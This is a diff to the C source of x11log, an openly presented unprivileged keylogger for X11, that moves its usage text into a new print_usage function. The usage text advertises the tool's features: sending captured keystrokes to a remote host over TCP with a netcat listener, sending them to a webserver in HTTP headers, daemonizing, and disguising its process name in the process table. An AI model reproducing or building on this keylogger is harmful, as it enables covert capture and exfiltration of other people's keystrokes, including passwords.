@@ -3,7 +3,8 @@
  * x11log - an unprivileged, userspace keylogger for X11
  *
  * This code is licensed under GPLv3.
- * (c) Erik Sonnleitner 2007/2015, es@delta-xi.net
+ * (c) Erik Sonnleitner 2007/2015
+ *    es@delta-xi.net || erik.sonnleitner@fh-hagenberg.at
  * www.delta-xi.net, https://github.com/esonn/x11log
  *
  * TODOs and Bugs: Please refer to the official project-page on Github
@@ -267,29 +268,7 @@ struct tm* initialize(int argc, char ** argv, struct config_struct* config) {
 			config->obfuscate= 1;
 			break;
 		  case '?':
-			log(0, stderr, " x11log - a tiny, non-privileged, unobtrusive local/remote keylogger for X11.\n");
-			log(0, stderr, " (c) by Erik Sonnleitner <es@delta-xi.net> 2007/2015, licensed under GPLv3.\n");
-			log(0, stderr, " Please refer to Github for bugs, comments, requests: github.com/esonn/x11log\n\n");
-			log(0, stderr, " Usage: %s [OPTIONS]\n", argv[0]);
-			log(0, stderr, " Available options:\n");
-			log(0, stderr, "   -s <DISPLAY>    X-Display to use, default is :0.0\n");
-			log(0, stderr, "   -f <LOGFILE>    Log keystrokes to file instead of STDOUT. Text is\n");
-			log(0, stderr, "                   appended, logfile created if it does not exist.\n");
-			log(0, stderr, "   -l              Use smart line-wise buffering. See manpage for details.\n");
-			log(0, stderr, "   -r <HOST:PORT>  Log keystrokes to remote host. The other end needs a\n");
-			log(0, stderr, "                   program listening on the specified TCP port (e.g. using\n");
-			log(0, stderr, "                   BSD netcat: 'nc -p <port> -k')\n");
-#		   ifdef _HAVE_CURL
-			log(0, stderr, "   -h <HOST>       Log keystrokes to webserver within HTTP requests headers.\n");
-			log(0, stderr, "   -H <HOST>       like -h, but without buffering.\n");
-			log(0, stderr, "   -P              use POST instead of GET requests.\n");
-#		   endif
-			log(0, stderr, "   -d              Daemonize (requires -f or -r or both).\n");
-			log(0, stderr, "   -q              Be quiet (no output to console).\n");
-			log(0, stderr, "   -o              Obfuscate process name in process table.\n");
-			log(0, stderr, "   -O <NAME>       Rename process to given argument.\n");
-			log(0, stderr, "   -?              Print usage.\n");
-
+			print_usage(argv[0]);
 			exit(EXIT_FAILURE);
 		  default:
 			break;
@@ -346,6 +325,33 @@ struct tm* initialize(int argc, char ** argv, struct config_struct* config) {
 	/* just for logging */
 	rawtime = time(NULL);
 	return localtime(&rawtime);
+}
+
+
+void print_usage(char* basename){
+	log(0, stderr, "\n x11log v%s\n", X11LOG_VERSION);
+	log(0, stderr, " x11log is a tiny, non-privileged, unobtrusive local/remote keylogger for X11\n");
+	log(0, stderr, " (c) by Erik Sonnleitner <es@delta-xi.net> 2007/2015, licensed under GPLv3\n");
+	log(0, stderr, " Please refer to Github for bugs, comments, requests: github.com/esonn/x11log\n\n");
+	log(0, stderr, " Usage: %s [OPTIONS]\n", basename);
+	log(0, stderr, " Available options:\n");
+	log(0, stderr, "   -s <DISPLAY>    X-Display to use, default is :0.0\n");
+	log(0, stderr, "   -f <LOGFILE>    Log keystrokes to file instead of STDOUT. Text is\n");
+	log(0, stderr, "                   appended, logfile created if it does not exist.\n");
+	log(0, stderr, "   -l              Use smart line-wise buffering. See manpage for details.\n");
+	log(0, stderr, "   -r <HOST:PORT>  Log keystrokes to remote host. The other end needs a\n");
+	log(0, stderr, "                   program listening on the specified TCP port (e.g. using\n");
+	log(0, stderr, "                   BSD netcat: 'nc -p <port> -k')\n");
+#		   ifdef _HAVE_CURL
+	log(0, stderr, "   -h <HOST>       Log keystrokes to webserver within HTTP requests headers.\n");
+	log(0, stderr, "   -H <HOST>       like -h, but without buffering.\n");
+	log(0, stderr, "   -P              use POST instead of GET requests.\n");
+#		   endif
+	log(0, stderr, "   -d              Daemonize (requires -f or -r or both).\n");
+	log(0, stderr, "   -q              Be quiet (no output to console).\n");
+	log(0, stderr, "   -o              Obfuscate process name in process table.\n");
+	log(0, stderr, "   -O <NAME>       Rename process to given argument.\n");
+	log(0, stderr, "   -?              Print usage.\n");
 }
 
 char* decodeKey(int code, int down, int mod) {
